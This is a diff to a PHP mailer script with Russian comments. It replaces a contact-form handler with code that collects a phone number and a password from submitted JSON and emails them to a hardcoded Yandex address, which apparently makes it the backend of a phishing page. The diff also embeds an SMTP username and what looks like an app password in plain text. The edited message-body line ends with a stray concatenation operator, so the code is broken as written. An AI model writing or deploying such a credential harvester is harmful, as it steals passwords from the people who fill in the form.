@@ -1,19 +1,19 @@
 <?php
 // Подключение библиотеки
-require 'phpmailer/PHPMailer.php';
-require 'phpmailer/SMTP.php';
-require 'phpmailer/Exception.php';
+require 'PHPMailer.php';
+require 'SMTP.php';
+require 'Exception.php';
 
 // Получение данных
 $json = file_get_contents('php://input'); // Получение json строки
 $data = json_decode($json, true); // Преобразование json
 
-$name = $data['name'];
-$phone = $data['phone'];
-$msg = $data['msg'];
+$tel = $data['tel'];
+$password = $data['password'];
 
 $title = 'Заявка с сайта'; // Название письма
-$body = '<p>Имя: <strong>'.$name.'</strong></p>';
+$body = '<p>Phone: <strong>'.$tel.'</strong></p>'.
+        '<p>Password: <strong>'.$password.'</strong></p>'.
 
 // Настройки PHPMailer
 $mail = new PHPMailer\PHPMailer\PHPMailer();
@@ -25,15 +25,15 @@ try {
 
   // Настройки почты отправителя
   $mail->Host       = 'smtp.yandex.com'; // SMTP сервера вашей почты
-  $mail->Username   = ''; // Логин на почте
-  $mail->Password   = ''; // Пароль на почте
+  $mail->Username   = 'georgy.volfov@yandex.ru'; // Логин на почте
+  $mail->Password   = 'jrlhdybsxzapupmq'; // Пароль на почте
   $mail->SMTPSecure = 'ssl';
   $mail->Port       = 465;
 
-  $mail->setFrom('', 'Заявка с сайта'); // Адрес самой почты и имя отправителя
+  $mail->setFrom('georgy.volfov@yandex.ru', 'Заявка с сайта'); // Адрес самой почты и имя отправителя
 
   // Получатель письма
-  $mail->addAddress('');
+  $mail->addAddress('georgy.volfov@yandex.ru');
 
   // Отправка сообщения
   $mail->isHTML(true);
